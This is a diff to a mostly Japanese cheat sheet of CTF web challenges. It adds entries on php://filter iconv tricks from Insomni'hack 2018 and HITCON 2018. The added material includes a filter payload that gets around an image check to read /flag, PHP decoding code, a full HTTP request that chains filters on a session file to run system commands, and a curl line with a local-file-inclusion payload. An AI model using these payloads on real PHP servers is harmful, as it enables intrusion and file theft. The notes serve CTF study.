@@ -141,12 +141,59 @@ PD89YCRfR0VUWzFdYDs=
 ```txt
 curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=ls' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'   
 ```
-## 
+## convert flag to image file with "php：//filter/convert.iconv.IBM1154%2fUTF-32BE/resource" (Insomni'hack teaser 2018 - Cool Storage Service)
+https://gynvael.coldwind.pl/?lang=en&id=671  
 - **entrypoint**  
+fileをアップロードできるWebサイトがある。アップロードしたパスにはHTTPではアクセスできないらしい。  
+管理者は画像のURLを指定してダウンロードもできるらしい。  
+ダウンロードには`php://`が禁止されていないらしい。  
+`.php`,`.php{3-7}`,`.phtml`, `.php.xyz`あたりのアップロードしたあとに`php://filter/resource`でアクセスすることを試したけどダメだったらしい。  
+また、`php://filter/resource=/flag`をしても、読み込んだコンテンツが画像ファイルかどうかをチェックしているため、画像ファイルしか読み込めないようになっているらしい。  
+ここで、`php://filter/convert.iconv`機能を使えば、読み込んだファイルを別の文字コードに変換できるらしい。  
+`php：//filter/convert.iconv.IBM1154%2fUTF-32BE/resource=/flag`として`UTF-32BE`(webp画像ファイル)として変換すると、チェックをバイパスできるらしい。  
+これによって読み込んだ、画像ファイルに変換されたflagファイルを以下で元に戻してFlagゲット。  
+```php
+<?php
+$d = file_get_contents(
+ "php://filter/convert.iconv.UTF-32BE%2fIBM1154/resource=".
+ "data:image/png;base64,AAAEWAAAACsAAARbAAAAIwAABFsAAAA/AA".
+ "AAKAAAAC8AAAA+AAAAYAAABCoAAAQFAAAEAwAABAYAAAAlAAAALwAABD".
+ "AAAACtAAAEUwAAAC8AAAA+AAAEDgAABAMAAAQFAAAEBwAAAD8AAAA/AA".
+ "AEBAAABAYAAAA/AAAEDAAAAGAAAAA/AAAEDwAAACcAAACO");
+echo $d;
+```
 - **payload**  
-## 
+```txt
+php：//filter/convert.iconv.IBM1154%2fUTF-32BE/resource=/flag
+```
+## php://filter/convert.iconv.UTF8.IBM1154 (HITCON CTF 2018 - One Line PHP Challenge)
+https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/B1A2JIjjm?type=view  
 - **entrypoint**  
+よくわからんけどconvertで変換される先をなんやかんやして`@<?php`から始まるように整形するらしい。  
+めっちゃ大変そう。  
 - **payload**  
+```txt
+POST /?orange=php://filter/convert.iconv.UTF8.IBM1154|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode||convert.iconv.UCS-2LE.UCS-2BE|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|string.rot13|convert.base64-decode|convert.iconv.UCS-2LE.UCS-2BE|convert.base64-encode|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-4LE.UCS-4BE|convert.base64-decode|string.strip_tags|convert.iconv.CP1025.UTF8/resource=/var/lib/php/sessions/sess_5uu8r952rejihbg033m5mckb17&1=var_dump(file_get_contents('/flag'));system('/read_flag'); HTTP/1.1
+Host: 54.250.246.238
+Proxy-Connection: keep-alive
+Content-Length: 27912
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: §null§
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2rwkUEtFdqhGMHqV
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=5uu8r952rejihbg033m5mckb17
+
+------WebKitFormBoundary2rwkUEtFdqhGMHqV
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+<data info of POC>
+<long padding (guarantee to generate upload progress file)>
+------WebKitFormBoundary2rwkUEtFdqhGMHqV--
+```
 ## 
 - **entrypoint**  
 - **payload**  
